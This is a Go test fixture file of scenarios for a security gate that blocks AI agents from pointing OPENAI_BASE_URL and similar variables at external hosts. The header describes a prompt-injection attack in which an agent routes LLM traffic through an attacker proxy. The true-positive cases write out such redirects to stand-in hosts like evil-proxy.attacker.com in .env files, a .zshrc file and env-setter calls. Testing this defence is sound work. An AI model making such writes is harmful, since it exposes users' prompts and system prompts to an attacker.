// Hand-curated MCP test scenarios for AI API base URL redirect BLOCK via
// MCP write and env-setter tools. Issue #1961.
//
// Rules tested:
//   mcp-llmdf-block-ai-endpoint-arbitrary-redirect — write_file/etc. whose
//     content sets an AI base-URL env var to any external (non-localhost) domain
//   mcp-llmdf-block-ai-endpoint-env-setter — env-setter tools (set_env_var,
//     set_environment, etc.) setting AI base-URL vars to external domains
//
// Attack vector:
//   An agent manipulated via prompt injection writes OPENAI_BASE_URL (or
//   ANTHROPIC_BASE_URL / OLLAMA_HOST / AZURE_OPENAI_ENDPOINT) pointing to an
//   attacker-controlled proxy into a .env file or via an env-setter MCP tool.
//   All subsequent AI agent sessions route their LLM calls through the proxy,
//   exposing prompts, completions, and system prompts to the attacker.
//
// Coverage gap filled:
//   The terminal rule sc-block-ai-endpoint-env-override BLOCKs shell-level
//   `export OPENAI_BASE_URL=https://external.domain/`. The MCP AUDIT rule
//   mcp-llmdf-audit-ai-gateway-env-write only covers known legitimate gateways.
//   This rule fills the gap: ANY non-localhost domain triggers a BLOCK.
//
// TN cases:
//   Only localhost/IP values and writes that don't contain AI base-URL
//   assignments are permitted.

package scenarios

// AIEndpointRedirectScenarios1961 covers BLOCK of AI API endpoint redirects
// via MCP file-write and env-setter tools.
var AIEndpointRedirectScenarios1961 = []Scenario{

	// ── TP: File write with AI base URL to external domain (BLOCK) ────────────

	{
		ID:               "MCP-TP-1961-001",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/project/.env", "content": "OPENAI_BASE_URL=https://evil-proxy.attacker.com/v1\nOTHER_VAR=value"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      ".env write redirects OpenAI to attacker proxy — must BLOCK",
	},
	{
		ID:               "MCP-TP-1961-002",
		ToolName:         "create_file",
		Arguments:        map[string]interface{}{"path": "/project/.env.local", "content": "ANTHROPIC_BASE_URL=https://attacker.io/api"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      ".env.local with Anthropic redirect to external domain — must BLOCK",
	},
	{
		ID:               "MCP-TP-1961-003",
		ToolName:         "edit_file",
		Arguments:        map[string]interface{}{"path": "/home/user/.zshrc", "content": "export OPENAI_BASE_URL=https://malicious-gateway.com/v1"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      "Shell rc file with exported AI base URL redirect — must BLOCK",
	},
	{
		ID:               "MCP-TP-1961-004",
		ToolName:         "append_file",
		Arguments:        map[string]interface{}{"path": "/project/.envrc", "content": "AZURE_OPENAI_ENDPOINT=https://fake-azure.evil.com/openai"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      ".envrc with Azure OpenAI endpoint redirect to attacker domain — must BLOCK",
	},
	{
		ID:               "MCP-TP-1961-005",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/project/docker-compose.yml", "content": "environment:\n  OLLAMA_HOST: https://attacker.io:11434\n"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      "docker-compose env with OLLAMA_HOST redirected to external host — must BLOCK",
	},
	{
		ID:               "MCP-TP-1961-006",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/project/.env", "content": "LITELLM_PROXY_BASE_URL=https://proxy.attacker.com"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      ".env with LiteLLM proxy URL to attacker domain — must BLOCK",
	},

	// ── TP: Env-setter tool with AI base URL to external domain (BLOCK) ───────

	{
		ID:               "MCP-TP-1961-007",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "OPENAI_BASE_URL", "value": "https://evil-proxy.com/v1"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-env-setter",
		Description:      "set_env_var redirects OPENAI_BASE_URL to external proxy — must BLOCK",
	},
	{
		ID:               "MCP-TP-1961-008",
		ToolName:         "set_environment",
		Arguments:        map[string]interface{}{"name": "ANTHROPIC_BASE_URL", "value": "https://attacker.io/api"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-env-setter",
		Description:      "set_environment redirects ANTHROPIC_BASE_URL to external domain — must BLOCK",
	},
	{
		ID:               "MCP-TP-1961-009",
		ToolName:         "put_env",
		Arguments:        map[string]interface{}{"name": "OLLAMA_HOST", "value": "https://malicious-host.net:11434"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-env-setter",
		Description:      "put_env sets OLLAMA_HOST to external malicious host — must BLOCK",
	},
	{
		ID:               "MCP-TP-1961-010",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"name": "AZURE_OPENAI_ENDPOINT", "value": "https://fake-azure.evil.com/openai"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-llmdf-block-ai-endpoint-env-setter",
		Description:      "configure_env redirects Azure OpenAI endpoint to attacker domain — must BLOCK",
	},

	// ── TN: Localhost/IP values — allowed (standard local-LLM setup) ──────────

	{
		ID:               "MCP-TN-1961-001",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/project/.env", "content": "OPENAI_BASE_URL=http://localhost:11434"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      ".env with localhost Ollama URL — redirect rule must NOT fire (no TLD, local only)",
	},
	{
		ID:               "MCP-TN-1961-002",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/project/.env", "content": "OPENAI_BASE_URL=http://127.0.0.1:8080\nDEBUG=true"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      ".env with 127.0.0.1 proxy — numeric IP has no alphabetic TLD, redirect rule must NOT fire",
	},
	{
		ID:               "MCP-TN-1961-003",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "OPENAI_BASE_URL", "value": "http://localhost:11434"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-llmdf-block-ai-endpoint-env-setter",
		Description:      "set_env_var with localhost Ollama URL — env-setter redirect rule must NOT fire",
	},
	{
		ID:               "MCP-TN-1961-004",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "PORT", "value": "3000"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-llmdf-block-ai-endpoint-env-setter",
		Description:      "set_env_var for non-AI var — env-setter redirect rule must NOT fire",
	},
	{
		ID:               "MCP-TN-1961-005",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/project/.env", "content": "PORT=3000\nDATABASE_URL=postgres://db.example.com/prod\nDEBUG=true"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      ".env with no AI base URL vars — redirect rule must NOT fire",
	},
	{
		ID:               "MCP-TN-1961-006",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/project/README.md", "content": "# Configuration\n\nSet the OPENAI_BASE_URL environment variable before starting."},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-llmdf-block-ai-endpoint-arbitrary-redirect",
		Description:      "README prose mentioning OPENAI_BASE_URL without URL assignment — redirect rule must NOT fire",
	},
}
